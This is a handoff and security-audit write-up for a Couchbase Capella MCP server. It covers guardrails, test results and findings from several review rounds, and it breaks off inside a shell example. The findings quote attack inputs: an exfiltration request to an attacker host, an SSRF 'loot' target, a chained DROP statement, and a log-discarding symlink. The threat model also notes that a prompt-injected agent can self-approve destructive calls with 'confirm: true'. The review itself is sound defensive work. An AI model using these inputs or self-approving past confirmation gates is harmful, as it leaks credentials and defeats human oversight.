# Capella support — handoff

What was added, what is verified, and what still needs a human before this goes
to `github.com/Couchbase-Ecosystem/`.

## The problem this solves

The server was built for self-managed Couchbase EE. Every `admin_*` tool routes
through `handlers.shared.admin_request()` to the ns_server Management REST API on
8091/18091 with Basic auth. Capella does not expose that surface to tenants: a
Capella database credential carries bucket-scoped data roles and never Full
Admin. So pointing the server at Capella produced a tool list that was ~90%
non-functional, failing one opaque 401 at a time.

It is an **authorization** boundary, not a network one — a couple of endpoints on
18091 (`/metrics`, `/prometheus_sd_config`) genuinely do work with a database
credential, and `admin_prometheus_targets` is kept for that reason.

## Two real bugs found in the previous `handlers/capella.py`

1. **App Services were pathed under `/projects/{p}/appservices`.** The actual v4
   path is `/projects/{p}/clusters/{c}/appservices/{id}`, confirmed in the
   Terraform provider source (`internal/resources/appservice.go`). Those two
   tools could never have worked.
2. **List endpoints did not paginate.** v4 returns
   `{"data": [...], "cursor": {"pages": {...}}}` and caps `perPage` at 100. The
   old code read page one and stopped, so an organization with 431 clusters
   reported 100 — silently, and confidently. Now handled centrally in
   `client.capella_list`, which follows the cursor and states explicitly when a
   result was capped.

## What was built

| File | Purpose |
|---|---|
| `deployment.py` | Deployment-mode detection (`auto`/`capella`/`self_managed`/`both`) and the capability matrix that unloads unusable tools |
| `handlers/capella/client.py` | v4 HTTP client: all verbs, retries, cursor pagination, status-specific diagnostic hints |
| `handlers/capella/spec.py` | Declarative registry — 61 v4 operations as `Op` records; tool schemas and dispatch are both generated from them |
| `handlers/capella/guardrails.py` | Blast-radius controls: organization pin, project allowlist, name prefix, environment ceiling, `mcp-env:` ownership marker |
| `handlers/capella/environment.py` | The 9 `capella_env_*` orchestration tools — the reconciler |
| `handlers/capella/__init__.py` | Aggregation and dispatch |
| `tests/test_capella.py` | Schema integrity, path construction, pagination, guardrails, deployment gating |
| `tests/test_capella_environment_flow.py` | Functional tests against an in-memory fake Capella: convergence and teardown ordering |
| `tests/test_capella_guardrail_hardening.py` | One regression test per security finding, plus a registry-derived sweep over every guarded op |
| `tests/test_capella_retry_safety.py` | Method-aware retry behaviour and misleading success states |
| `tests/conftest.py` | Resets the guardrails' process-global ceiling memo between tests |

Also modified: `server.py` (deployment gating in the tool filter, guardrail
posture in the startup banner, a directive error when a gated tool is called),
`.env.example`, `README.md`, `pyproject.toml`.

Verification status: `ruff check` clean, `ruff format` clean, **247 tests pass**
(also in randomised order). In Capella mode the server loads 84 of 204 tools — 70
`capella_*`, 13 `cb_*` diagnostics, and `admin_prometheus_targets`. See the
security audit at the end of this document.

## REQUIRED before publishing

1. **Delete `handlers/capella.py`.** The sandbox this was built in would not
    permit the removal. The package directory shadows the module so tests pass
    either way, but shipping both is confusing and the old file contains the two
    bugs above.
2. ~~**Replace `LICENSE`.**~~ **DONE.** `LICENSE` is now the stock, unmodified
    Apache-2.0 text, matching how `Couchbase-Ecosystem/mcp-server-couchbase` ships
    it (verified against that repo). Attribution lives in a new `NOTICE` file
    (`Copyright 2026 Couchbase, Inc.`) rather than being edited into the license
    body, which is the Apache convention and what section 4(d) requires
    redistributors to carry. Both files are now shipped in the wheel
    (`license-files`) and copied into the container image. A per-file
    `License: MIT — Copyright (c) 2026 Chris Ahrendt` header in
    `auth/scope_gate.py` was also corrected — it was the last stale attribution
    in the tree.
3. ~~**Decide the target org.**~~ **DECIDED: `Couchbase-Ecosystem`.** Every URL in
    the tree points there and a test pins it (`tests/test_project_metadata.py`), so
    it cannot drift back.

    Correcting my earlier claim in this section: I wrote that the official
    `mcp-server-couchbase` had been graduated out of `Couchbase-Ecosystem` into
    `couchbase/`. That was wrong — it is still at
    `github.com/Couchbase-Ecosystem/mcp-server-couchbase`, verified by fetching it.
    The decision and the precedent therefore agree.
4. ~~**Add `CONTRIBUTING.md`.**~~ **DONE.** Written against the sibling repo's shape
    (`Couchbase-Ecosystem/mcp-server-couchbase`), but the substance is specific to this
    codebase: nine conventions that are load-bearing for safety, each one present
    because breaking it produced a real finding during the review. `CODE_OF_CONDUCT.md`,
    `SECURITY.md` and `CODEOWNERS` remain absent org-wide, so they are not needed for
    parity.

    Two things came out of writing it. `pre-commit` was a declared dev dependency with
    **no configuration file**, so `pre-commit install` — which the setup instructions
    tell you to run — failed; `.pre-commit-config.yaml` now exists, with ruff pinned to
    the same version as the `dev` extra so the hook and CI cannot disagree. And
    `tests/test_contributing_guide.py` checks the guide's checkable claims: every file
    it points at, every helper it tells you to call, every script it tells you to run,
    the mutation counts it quotes, and its assertion that no `[PAT]` paths remain. A
    contributing guide is the one document a newcomer trusts completely and the one
    nobody re-reads.

## Verify against your own organization before relying on it

Most paths are transcribed from the Terraform provider's Go source or from
verbatim reference docs, and are marked `[TF]` / `[DOC]` in `spec.py`. A minority
are marked **`[PAT]`** — pattern-derived from a confirmed sibling, not
individually verified. They will 404 rather than misbehave, and they are the
first thing to check if a call fails:

- `capella_bucket_flush` (some revisions may use `PUT`)
- `capella_cluster_onoff_schedule_*`
- `capella_collections_list` / `_create` / `_delete`
- `capella_sample_bucket_load`
- `capella_app_service_turn_on` / `_turn_off` / `_certificate_get`
- `capella_app_service_admin_user_*`

Also worth confirming with a real credential in your own organization:

- **The `cb_perf_*` advisors.** They read `system:completed_requests`, which
  normally requires `query_system_catalog`. The official Couchbase MCP server
  ships them and claims Capella support, which is suggestive but not proof.
  If they fail, add them to `deployment.CAPELLA_REACHABLE_ADMIN_TOOLS`'s inverse
  — i.e. remove the `cb_` prefix from `_DEPLOYMENT_NEUTRAL_PREFIXES` and
  allowlist individually.
- **The cluster create defaults** in `environment._ensure` — a 3-node
  `data,query,index` group at 4 vCPU / 16 GB. That is a reasonable general
  default, not a cheap one. For mobile app testing a smaller single-node shape is
  likely right, and the cost difference across many short-lived environments is
  the whole ballgame. Confirm the shape you need, then change the default.

## Deferred deliberately

- **Prometheus metrics scrape.** `admin_prometheus_targets` gives service
  discovery, but there is no tool yet that scrapes `:18091/metrics` and filters
  the series. Useful for diagnosing a test run; not needed to stand an
  environment up.
- **FTS index administration.** No v4 equivalent exists, and reachability on
  18094 with a database credential is unconfirmed. This is the one genuine
  capability gap rather than a responsibility Couchbase took over.
- **Backup, XDCR, eventing, CMEK, audit-log export, billing.** All present in v4
  and all straightforward additions to `spec.py` — one `Op` record each — but
  none of them serve standing up and spinning down a test target, so they were
  left out rather than shipped untested.

## Suggested CI configuration

```bash
CB_DEPLOYMENT=capella
CB_ADMIN_READ_ONLY_MODE=false
CAPELLA_API_KEY_SECRET=<from your secret store>
CAPELLA_ORG_ID=<org uuid>
CAPELLA_ALLOWED_PROJECTS=<test project uuid>      # production project NOT listed
CAPELLA_ENV_NAME_PREFIX=mcptest-
CAPELLA_MAX_ENVIRONMENTS=5
CAPELLA_ENV_TTL_HOURS=4
CB_ADMIN_SCOPE_AUTOMATION=couchbase-admin-mcp:automation
```

Issue the pipeline's service principal a token carrying the write **and**
automation scopes so teardown runs without a per-call confirmation. Leave
`CB_ADMIN_ALWAYS_CONFIRM` empty for the Capella environment tools — the project
allowlist and name prefix are the controls doing the work there, and putting
teardown behind a human would defeat the point.

Then schedule `capella_env_reap` with `dry_run=false` on a cadence shorter than
the TTL. Without it, the CI job that crashes before its teardown step bills
until somebody notices.

---

# Security & correctness audit

Four rounds of adversarial review — two self-directed, two by an independent
reviewer working from the stated security model, plus a final confirmation pass.
Twenty-three findings, all fixed, each with a named regression test.

Threat model throughout: a confused, looping or prompt-injected agent destroying
or exposing production infrastructure, leaking credentials, or running up
unbounded cloud spend.

## The findings that mattered

**F1 — HIGH. Child-resource operations bypassed the ownership guard.**
Twelve destructive ops received only the project allowlist check. Every one of
them addresses a cluster, so with an allowlisted project, `capella_bucket_flush`
or `capella_bucket_delete` could be aimed at a cluster that does *not* carry the
name prefix. The prefix guard — the entire defense against a hand-made production
cluster sitting inside a test project — protected nothing but
`capella_cluster_delete`. Now every guarded op carrying a `cluster_id` fetches the
live cluster and checks ownership, mutations as well as deletes: adding
`0.0.0.0/0` to a production allowlist or rewriting its sync access-control
function is as far out of scope as deleting it.

**F2 — HIGH. The ownership check failed open.** It was wrapped in
`if isinstance(cluster, dict)`, so an unexpected response shape skipped the check
and the delete proceeded. A guard that disappears when the world looks strange is
not a guard. Now fails closed.

**F9 — HIGH. `POST` was retried on 5xx and dropped connections.** A create that
succeeded and then lost its response to a 502 was retried, producing a second
cluster — billed, and invisible. Retries are now method-aware: `POST` retries only
on statuses that prove the request was never processed (429/408/425).

**F12 — HIGH. Project delete was an indirect route to unmanaged clusters.** No
cluster tool involved, so the per-cluster check never fired. Now refuses if the
project holds any cluster this server does not own.

**F15 — HIGH. `capella_env_ensure` never checked ownership on a cluster it
*adopted*.** It validated the name it intended to create, then configured whatever
it found — so a prefix-matching cluster, including one explicitly listed in
`CAPELLA_PROTECTED_CLUSTERS`, was freely reconfigurable. Protection held against
deletion and nothing else.

**F19 — HIGH. The reaper could delete the wrong cluster.** `_reap` resolved a
concrete `cluster_id` while listing, then discarded it and re-derived the target
by *name* from the marker's free text. A marker naming a different environment
sent teardown at a live, non-expired cluster — and every guardrail still passed,
because that cluster was also inside the sandbox. The checks were simply applied
to the wrong resource. Teardown now verifies the resolved id matches the pinned
one.

**F22 — MEDIUM. A fix of mine introduced a denial of service.** The
ceiling-refusal memo added to reduce API amplification was one process-global
timestamp. On the HTTP transport one process serves many callers, so a single
saturated project refused every other project's creates for 15 seconds — and
re-polling that project re-stamped the memo, sustaining an org-wide block. Turning
"this project is full" into "nothing may be created anywhere" is a DoS, not an
optimisation. The memo is now keyed to exactly the scope the count sums over.

Also fixed: F3 falsy `project_id` silently skipping the allowlist; F4/F18 spend
ceiling enforced only in the orchestrator and only per-project; F5 deletion
protection blocking the non-destructive park operation; F6 fixed `Aa1!` password
prefix; F7 protected-cluster list matching ids but not names, so listing a cluster
by name protected nothing while reading as configured; F8 unrecognised
`deletionProtection` spellings; F10 "ready" reported for a cluster with an empty
allowlist; F11 a requested scope silently skipped; F13 guardrails that were inert
as configured now warned about at startup; F14/F17 guardrail decisions made from
summarised LIST data that may omit `deletionProtection`; F20 unscoped-mode ceiling
semantics; F23 dry-run and real-run reap disagreeing about what is reapable.

## Verification

- **247 tests**, passing in randomised order (no ordering dependencies).
- `ruff check` and `ruff format` clean.
- The containment sweep is **derived from the registry, not a hand-written list**:
  every guarded op carrying a `cluster_id` (33 today) is automatically asserted to
  refuse both an unmanaged cluster and an unallowlisted project, so a newly added
  op cannot ship without inheriting the guard. A separate test asserts the sweep
  itself is non-empty, so it cannot pass vacuously.
- A structural test asserts both ceiling call sites share one counting
  implementation, guarding against the two definitions drifting apart again.
- Repo-wide scan for `eval`/`exec`/`shell=True`/`pickle`/`verify=False`: the only
  hit is the pre-existing, documented `CB_ADMIN_TLS_INSECURE` opt-in for
  self-signed self-managed clusters. The Capella client deliberately has no such
  escape hatch — that flag must not be able to weaken the control plane.
- Self-managed mode still loads 134 tools with zero Capella leakage.

## Accepted limitations, stated rather than hidden

- **Concurrent `capella_env_ensure` for the same `env_name`** can race and create
  two clusters; there is no distributed lock and deliberately no state file. In
  practice `env_name` encodes a branch or PR, so collisions are unlikely, and
  Capella rejects duplicate cluster names within a project.
- **The ceiling is check-then-act**, so tightly concurrent calls can overshoot by a
  small margin. It is a spend guard against a runaway loop, not a hard quota.
- **In unscoped mode the ceiling is per-project**, because with no allowlist there
  is no set of projects to sum across. `policy_warnings()` says so, and the
  startup banner prints it.
- **The whole per-cluster ownership layer depends on
  `CAPELLA_ENV_NAME_PREFIX`.** Without it, containment degrades to the project
  allowlist alone. The server warns loudly at startup rather than degrading
  silently — but set the prefix.

---

# Deep scan — findings OUTSIDE the Capella code

A second, wider review covered the pre-existing code the Capella work ships
alongside: the OAuth/JWT layer, the Flask GUI, the self-managed handlers, logging
and the container. **The most serious problems in this repository are not in the
Capella code.** `SECURITY_SCAN.md`'s "No vulnerabilities" verdict is contradicted
by the code, and its own scope line excludes the GUI and the Dockerfile — that
document must be re-scoped before any customer sees it.

## Critical — fixed in this pass

**The GUI could exfiltrate the cluster administrator password.** `POST /api/config`
accepted `CB_CONNECTION_STRING` from any caller, and `handlers/shared.py` re-reads
it per request and attaches HTTP Basic credentials to every admin call. So
`{"CB_CONNECTION_STRING": "couchbase://attacker.tld"}` followed by any admin tool
sent the real Couchbase administrator username and password, in cleartext, to a
host of the caller's choosing. It required no authentication (the default), no
confirmation, and worked in read-only mode — because it never performed a write,
it changed where the writes were pointed. `CB_ADMIN_TLS_INSECURE=true` via the same
endpoint enabled MITM of the real cluster. **The endpoint is removed.**

**The GUI let a caller self-promote past the confirmation gate.**
`automation_mode = bool(body.get("automation")) or ...` read the bypass from the
request body. Since `CB_ADMIN_ALWAYS_CONFIRM` ships empty, `{"automation": true}`
skipped confirmation for every write tool including bucket delete and hard
failover. This is the exact thing `.env.example` promises cannot happen. **The
request-body term is removed**; automation now comes only from server-side config.

**The GUI was an unauthenticated admin console by default.** `OAUTH_ENABLED`
defaults false and appears in neither `.env.example` nor the README, and the
`require_auth` decorator was never actually applied to any route. **Both
enforcement paths now fail closed**, requiring `OAUTH_ENABLED=true` or an explicit
`CB_GUI_INSECURE_NO_AUTH=1` acknowledgement.

**Every successful tool response was unredacted.** Redaction applied only to logs
and error context, so `ok()` dumped secrets straight into the model's context —
`admin_alerts_get` (SMTP password), `admin_kmip_get`, `admin_eventing_get`
(function source, which routinely embeds API keys), `admin_xdcr_references_list`
(remote-cluster credentials). All are annotated read-only, so they are precisely
the set that loads in the "safe" default deployment. **`ok()` now redacts**, with a
single narrow, greppable exception (`ok_allow_secrets`) for the one path that must
return a generated password once. A test asserts that exception has exactly one
caller.

**Authorization was not enforced at all on the HTTP transport.** The ASGI
middleware sets the token claims in a contextvar belonging to the *request* task,
while tool dispatch runs in a separate task created at startup — contextvars
snapshot at task creation, so `check_scope` always saw `None` and returned
"allowed". Read/write scope separation was inoperative, and
`session_has_automation_scope()` was permanently False, which made the
`CB_ADMIN_ALWAYS_CONFIRM` hard ceiling dead code. The existing tests could not
catch it because they set the contextvar in the same task as the call.
**The gate now fails closed** when `CB_ADMIN_HTTP_REQUIRE_AUTH=true`. That does not
repair the plumbing — see "Still open" — but it converts a silent bypass into a
loud refusal.

**Stored XSS in the admin console.** `highlightJSON` injected every tool result as
raw HTML via `dangerouslySetInnerHTML`, so any attacker-influenced value in cluster
state (a bucket, user, index or eventing-function name) became script in the
admin's browser, same-origin, inheriting their session — the one finding that
survived a fully hardened auth configuration. **Output is now escaped before
highlighting.**

## Also fixed

`emailPass` did not match `"password"`, so the SMTP password was logged in
plaintext — `pass`/`pwd`/`passwd` added to the redaction rules. The index-DDL
validators anchored only at the start of the statement, so
`CREATE INDEX i ON b(x); DROP SCOPE b.prod` passed and relied on the query
service's single-statement rule, which this server does not own — chaining and
comments are now refused. `admin_request` retried POSTs on network errors, which
could re-issue a failover or a flush — now method-aware, the same fix already
applied to the Capella client. `form_value` stringified lists with Python repr, so
a TLS `cipherSuites` list silently failed to apply (an unparseable value means "use
defaults") — now JSON-encoded. Twelve mis-annotated writes are now
`destructiveHint=True`, including `admin_user_create` (a PUT, so it overwrites an
existing administrator), `admin_eventing_deploy` (runs arbitrary server-side
JavaScript) and `admin_audit_set` (can disable audit logging). OIDC now rejects
symmetric/`none` algorithms, requires `OAUTH_AUDIENCE` when auth is required
(without it any validly-signed token from the tenant was accepted), requires
`exp`/`iss`, and refuses to start with `OAUTH_SKIP_VERIFY` on a non-loopback bind.
An invalid token is now always a 401 instead of being downgraded to "anonymous,
enforcement off". The hard ceiling is evaluated independently of the confirmation
set and unknown entries are reported at startup. The container was missing
`deployment.py` and **would have failed at import**; a `.dockerignore` now keeps
`.env`, keys and `.git` out of the build context; `flask-cors` is pinned past
CVE-2024-6221.

## STILL OPEN — needs a decision

1. **HTTP transport authorization is architecturally broken.** Fixing it properly
   means per-client sessions (`StreamableHTTPSessionManager`) with the
   authenticated principal bound to the session and read inside `call_tool`. Until
   then: **use the stdio transport.** With `CB_ADMIN_HTTP_REQUIRE_AUTH=true` the
   HTTP transport now refuses every call rather than enforcing nothing.
2. **The hard ceiling cannot distinguish a human from a model.** For a
   non-automation principal it degrades to `confirm: true` — a value the LLM emits.
   A prompt-injected agent with an ordinary write token can flush a bucket by
   re-calling with `confirm: true`. Genuine human approval needs an out-of-band
   channel (MCP elicitation with a real client-side prompt, or a one-time approval
   token). `.env.example`'s claim that "the automated caller provably cannot bypass
   it" is currently false and should be softened or made true.
3. **SSRF sinks, unfixed** — they need an allowlist design and a decision about
   whether the features are needed at all: `admin_xdcr_reference_create`
   (`hostname`), `admin_node_add` (`hostname`), `admin_logs_collect_start`
   (`uploadHost` — a one-call cluster-log exfiltration primitive),
   `admin_kmip_set` (`kmipHost` — repoints the master encryption key source),
   `admin_alerts_set` + `admin_alerts_test_email` (`emailHost`).
4. **Mass assignment** — `admin_security_settings_set`, `admin_internal_settings_set`,
   `admin_query_settings_set`, `admin_bucket_update`, `admin_alerts_set` and the
   encryption handlers forward *every* caller-supplied key to sensitive endpoints.
   Needs per-tool key allow-lists.
5. **`block_dml_if_readonly` has zero callers** — dead safety code, which is worse
   than none because it reads as a control. Wire it into every statement-accepting
   handler or delete it. `cb_explain_query` also forwards a caller statement
   verbatim when it already starts with `EXPLAIN`.
6. **Logging** — no redaction filter on the sinks (only call-site redaction), log
   files created world-readable, ~2 MB total retention per level (trivial
   anti-forensics), CRLF not stripped (log-line forgery), and no principal or
   source IP on any record, so "who deleted the bucket" is unanswerable.
7. **The GUI has never been run.** `index.html` contains JSX with no Babel and no
   build step, so the browser raises a SyntaxError and nothing renders. It also
   still has CSRF (`get_json(force=True)` accepts `text/plain`, no token), CORS
   credentialed to every localhost port, no CSP or SRI on CDN scripts, a
   bypassable remote-bind guard that does not run under gunicorn, an
   unauthenticated `/auth/token`, and no audit logging of any privileged operation.

---

# Fix B — HTTP transport authorization

## What was broken

The bearer token was validated in ASGI middleware and the claims stashed in a
`contextvars.ContextVar`. That cannot work on this transport:

```
middleware task            dispatch task (created at session init)
───────────────            ───────────────────────────────────────
set_token_claims(claims)   call_tool() -> check_scope() -> claims is None
```

`contextvars` snapshot at task creation, and the SDK's dispatch loop
(`Server._handle_request`) is a *sibling* task started before any request existed.
So a value set in the request's task was never visible where the authorization
decision is made. Silently, every time.

The consequence that mattered most for the enterprise flow:
`session_has_automation_scope()` was permanently `False`, so the automation trust
model never engaged. A child agent holding a valid automation-scoped token was
asked for `confirm: true` on every write — and supplied it, which is the model
rubber-stamping itself. Read/write scope separation was also inoperative, and
`CB_ADMIN_ALWAYS_CONFIRM` was dead code because it is only consulted for
automation principals.

The existing tests passed because they set the contextvar in the same task that
awaited `call_tool`. They tested the module, not the transport.

## The fix

**Resolve the principal where the decision is made.** The SDK sets `request_ctx`
— including the Starlette request — inside `_handle_request`, i.e. inside the
dispatch task. `auth/request_auth.py` reads the Authorization header from that
request, validates it, and caches the result briefly (keyed by a hash of the
token, never the token; never past the token's own `exp`). There is no cross-task
handoff left to get wrong.

**Per-client sessions.** `StreamableHTTPSessionManager` replaces the single
`StreamableHTTPServerTransport(mcp_session_id=None)`, which had put every HTTP
client into one shared MCP session with no session binding at all — any client
could POST with no `Mcp-Session-Id` and land in it. Now each client gets its own
session and id, and a call without one is refused with a 400.

**Transport hardening.** Origin/Host validation via the SDK's
`TransportSecuritySettings` (`CB_ADMIN_ALLOWED_ORIGINS`), and the server now
refuses to start if asked to bind a non-loopback address while
`CB_ADMIN_HTTP_REQUIRE_AUTH` is false. The GUI already had that guard; the MCP
server did not, while both the README and the Dockerfile tell operators to set
`CB_ADMIN_HOST=0.0.0.0`.

**The middleware stays, demoted.** It rejects a bad credential at the edge with a
401 and emits the auth-failure audit record with the client address — which the
dispatch layer cannot see for a request it never receives. It is no longer
load-bearing for authorization.

## Verification

`tests/test_http_transport_live.py` boots a real uvicorn server and drives it with
a real MCP handshake. Every one of these would have failed against the previous
implementation:

| Behaviour | Result |
|---|---|
| Forged token | 401 at the edge |
| **Automation-scoped write** | **confirmation NOT demanded** |
| Write scope without automation | confirmation demanded |
| Read-only token calling a write tool | denied on scope |
| Two clients | different session ids |
| Call with no session id | 400 |
| `/mcp` and `/mcp/` | both 200 |

Plus `tests/test_http_authorization.py`, which reproduces the task-boundary
topology directly — creating the consumer task first, then setting a contextvar in
another task — so the tests can actually fail on the original bug rather than
passing regardless.

370 tests pass; the live ones are marked `live` and can be excluded with
`-m "not live"`.

## Two defects found only by running it

1. **A 307 on `/mcp`.** Starlette's default `redirect_slashes` answers a POST to
   `/mcp` with a redirect to `/mcp/`, and MCP clients do not follow it — so a
   client configured with the documented URL got a redirect instead of a session.
   Disabling `redirect_slashes` swung it to a 404 instead, so the endpoint is now
   an explicit ASGI shim that accepts both. Pre-existing, and invisible to unit
   tests.
2. **`pytest-asyncio` was not installed**, so `@pytest.mark.asyncio` tests were
   silently collected as no-ops rather than failing. It is in the dev extras;
   worth pinning in CI so async tests cannot quietly stop running.

## Still open

- **The GUI**: harden and make it build (it contains JSX with no transpiler, so it
  has never rendered).
- **`.env.example`'s hard-ceiling wording** still implies a human keystroke. It
  should say "requires a principal *without* the automation scope", which is what
  the code enforces.
- **TLS**: the HTTP transport is plain HTTP. Terminate TLS in front of it, or
  bearer tokens cross the network in clear.

---

# Security review rounds 2–4

Three further adversarial passes ran after the section above, each by an independent
reviewer, with every finding fixed and then re-verified by execution. The pattern worth
recording is that **two fixes reported as complete in round 2 were absent from the
code**, and **two round-3 fixes introduced worse problems than they solved** — which is
why every claim below is backed by a command that was actually run, and why the
mutation suites exist.

## Rounds 2–3 (repo-wide)

| Severity | Finding | Fix |
|---|---|---|
| HIGH | The JWKS unknown-`kid` throttle I added in round 2 was itself an unauthenticated DoS: it recorded on **every** call, so one attacker request refused all legitimate tokens for 60s | Per-`kid`, miss-only, plus a global budget (below) |
| HIGH | `_ensure_private_logfile` raised to refuse a symlinked log path and its own `except OSError` swallowed the refusal — the handler attached anyway and followed the link, so `ln -sf /dev/null` discarded the audit trail | Returns `bool`; the handler is skipped and the operator told the level is unlogged |
| HIGH | `POST /auth/token` minted IdP tokens to **unauthenticated** callers using the server's own client secret | Endpoint removed; clients get tokens directly from the IdP |
| HIGH | `CB_ADMIN_PROFILE=workstation` + http + `0.0.0.0` re-opened every relaxation over the network | `validate()` refuses it unless `CB_ADMIN_WORKSTATION_CONTAINER_BIND=1` |
| HIGH | The GUI had no scope check, no audit records, and a ceiling test nested under `automation_mode` | All three routed through the new `authz.py`, shared with the MCP dispatch |
| MED | `correlation_id` was documented, plumbed, and **never read** — every enterprise record was untraceable to the human action | Captured in `call_tool`, declared on all 134 tool schemas |
| MED | `_classify_result` recorded provisioning progress as `denied_handler` | Keyed on an `err()`-stamped marker, not on an `"error"` key |
| MED | `allowed_hosts` answered 421 to every request behind a Service or ingress | `CB_ADMIN_ALLOWED_HOSTS` |
| MED | `CB_ADMIN_AUDIT_FILE` was a phantom that `validate()` accepted as proof of a durable sink | Implemented; an unusable path is now **fatal at startup** |
| MED | 7 mass-assignment sinks forwarded undeclared keys to settings endpoints | Allow-list derived from each tool's own `inputSchema`, refusing rather than dropping |
| MED | The eventing curl guard read one path and failed open on four other shapes | Depth- and breadth-capped recursive walk |

## Round 4 — including two problems my own round-3 fixes created

| Severity | Finding | Fix |
|---|---|---|
| CRITICAL | **GUI CSRF.** `get_json(force=True)` + no Origin check meant any page the developer visited could drive the admin API with a CORS-"simple" `text/plain` POST. No preflight, no cookie to protect with SameSite, and the attacker's own `confirm: true` satisfied the ceiling | Origin/Referer validation + `Content-Type: application/json` required (which forces a preflight the origin allowlist then refuses) |
| HIGH | **The image could not start.** The Dockerfile and wheel omitted `audit.py`, `authz.py`, `profile_config.py` — every module added during the review. `import server` raised `ModuleNotFoundError`, so the artifact that would ship had none of the controls | Both lists corrected; `tests/test_packaging.py` derives the requirement from `server.py`'s real imports |
| HIGH | **The GUI's new audit records were discarded.** `configure_from_env()` had one caller (`server.py`), so the console logged to an unconfigured tree and `lastResort` drops INFO | GUI configures logging; tests assert on a real file sink, not `caplog` |
| HIGH | **My JWKS budget did not stop the attack.** `kid` is attacker-chosen, so cycling it never hit the per-kid memo: 200 requests → 200 outbound fetches at the identity provider | Global token bucket on **refreshes** (`CB_ADMIN_JWKS_REFRESH_BUDGET`) |
| HIGH | ...and a token with **no** `kid` skipped the gate entirely, restoring 1:1 amplification (101 fetches per 100 requests) | Gate on the miss, not on the header being present |
| MED | The egress walk fails open on a **scalar root**, reachable as `target="s3://169.254.169.254/loot"` through `admin_backup_restore_run` | Scalar roots and root-level list items are checked |
| MED | `redact_text` masked the diagnosis in cluster validation errors (`{"password": "must be at least 6 characters"}` → `***REDACTED***`), which leaves an autonomous agent unable to self-correct | Multi-word values treated as prose; `Bearer`/`Basic` credentials matched explicitly |
| MED | `human_is_present()` trusted the profile label, so the container-bind waiver let a remote caller satisfy the hard ceiling | Requires stdio; callers state their own evidence |
| MED | Capella composites reached primitives directly, so `CB_ADMIN_DISABLED_TOOLS` / `CB_ADMIN_ALWAYS_CONFIRM` did nothing about `capella_env_teardown` | `_assert_primitive_permitted()` in `_invoke` |
| LOW | `list_tools` had no authorization check — full tool and schema disclosure to any unauthenticated HTTP client | Gated when auth is required on HTTP |

## Deliberate decisions a runbook should record

- **The hard ceiling is only satisfiable over stdio.** `confirm: true` counts as a human
  answer when an MCP client surfaced the call to a person. It does **not** count in the
  console: the workstation console is unauthenticated, and its origin allowlist must
  admit any localhost port, so a browser request cannot evidence *which* human — the
  CSRF finding showed exactly how a page could supply one. `CB_ADMIN_ALWAYS_CONFIRM`
  ships empty, so unattended teardown is unaffected unless an operator opts in.
- **An unwritable `CB_ADMIN_AUDIT_FILE` stops startup.** In an unattended chain the log
  is the only accountability, so degrading quietly is not an option. The image creates
  and chowns `/var/log/couchbase-admin-mcp`.
- **Egress guards over-refuse rather than under-refuse**, with
  `CB_ADMIN_EGRESS_EXEMPT_FIELDS` as the operator's escape hatch.
- **A saturated JWKS budget can extend a key-rotation outage.** An unauthenticated party
  cycling key ids keeps the budget full, so children holding tokens signed by a newly
  rotated key fail auth until the budget frees. The alternative is 1:1 amplification
  against the IdP; raise `CB_ADMIN_JWKS_REFRESH_BUDGET` during a planned rotation.

## Verification

- **525 tests** pass, in both file order and randomised order; 7 live-HTTP tests pass
  separately. `ruff check` and `ruff format --check` clean.
- **45 mutation tests** across two suites (`mutate4.py`, `mutate5.py`): each
  re-introduces one specific bug and asserts the suite fails. **45/45 caught.** This
  found what a green suite could not: five tests that asserted on a *helper* while the
  composition went uncovered, and one test that passed only because it exercised a
  fallback path rather than the fix.
- Flows confirmed end to end: workstation/stdio (human confirms destructive ops),
  enterprise/http with an automation-scoped token (writes execute with no confirmation),
  and all 134 tools driven with every declared parameter — **0 tools reject their own
  declared arguments**, so the mass-assignment allow-list does not block legitimate use.

---

# Round 5 — the three remaining deliverable items

Each of the three turned out to be worse than the earlier note said, which is worth
recording because in all three cases the note had been written from reading the code
rather than running it.

## TLS: the enterprise transport was cleartext

`uvicorn.Config(...)` was built with no `ssl_certfile` and no `ssl_keyfile`. The bearer
tokens this transport carries hold the automation scope, and that token is the credential
the entire unattended model rests on — the scope gate, the hard ceiling and the audit
principal are all downstream of "the caller holds a legitimate token". An observer who
captured one became an authorized child agent and bypassed every control at once.

`tls_config.py` now supports both shapes, because both are real:

| Variable | Meaning |
|---|---|
| `CB_ADMIN_TLS_CERT_FILE` / `CB_ADMIN_TLS_KEY_FILE` | This process terminates TLS |
| `CB_ADMIN_TLS_KEY_PASSWORD` | Only if the key is encrypted |
| `CB_ADMIN_TLS_CLIENT_CA_FILE` | Mutual TLS — a stolen bearer token alone is then not enough |
| `CB_ADMIN_TLS_TERMINATED_EXTERNALLY=1` | An ingress, mesh or sidecar handles it in front |

**A non-loopback HTTP bind with neither a certificate nor the acknowledgement is fatal at
startup.** The acknowledgement is mandatory rather than inferred because "a mesh handles
it" and "nobody configured it" produce byte-identical processes; the only difference is
whether a human decided. Loopback is exempt. A half-configured pair is fatal everywhere,
including loopback, because it looks configured and silently is not.

Verified by a real handshake against the real server, not by inspecting the arguments:
TLSv1.3 / AES-256-GCM negotiated, cleartext client refused, an untrusting client
rejecting the chain (so the certificate is genuinely presented), and mutual TLS refusing
a client with no certificate. Two of those tests are marked `live`.

## The console had never worked

`gui/static/index.html` is 567 lines of JSX served in a plain `<script>` with React from
cdnjs and **no transpiler anywhere on the page**:

```
$ node --check <extracted app script>
    <div className="result-empty">
    ^
SyntaxError: Unexpected token '<'
```

React never mounted. The page was blank, and had been from the start. Nothing caught it
because every backend test drives Flask directly and none ever loaded the page.

Fixed by vendoring Babel standalone, React and react-dom under `gui/static/vendor/` and
marking the app script `type="text/babel"`. Vendoring rather than using a CDN also fixes
two things the earlier note missed: the console could not load at all inside an
air-gapped or egress-restricted network, and an administration tool for a production
database was fetching its JavaScript from a third party at request time. The Google Fonts
`<link>` is gone for the same reasons — the intended faces stay first in the font stacks
and fall back to system fonts.

Verified by compiling the real JSX with the vendored Babel and rendering the `App`
component: 23,668 bytes compiled, 1,861 bytes of markup. `tests/test_gui_frontend.py`
asserts the render, and includes a guard so that converting the source to
`React.createElement` later fails loudly rather than leaving the Babel assertion vacuous.

## A verifier for the four inferred v4 paths

`scripts/verify_capella_paths.py`. Read-only and non-destructive by default: GETs are
called for real, and write operations are probed with `OPTIONS` — a method the API does
not implement — so a 404 means the route does not exist and a 405 means it does. It never
sends a real write unless `--write-probe` is passed **and** specific operations are named
with `--only`.

```bash
export CB_CAPELLA_API_KEY='<the API key SECRET, not its id>'
python3 scripts/verify_capella_paths.py --org <organization_id> --only-pat   # the 4
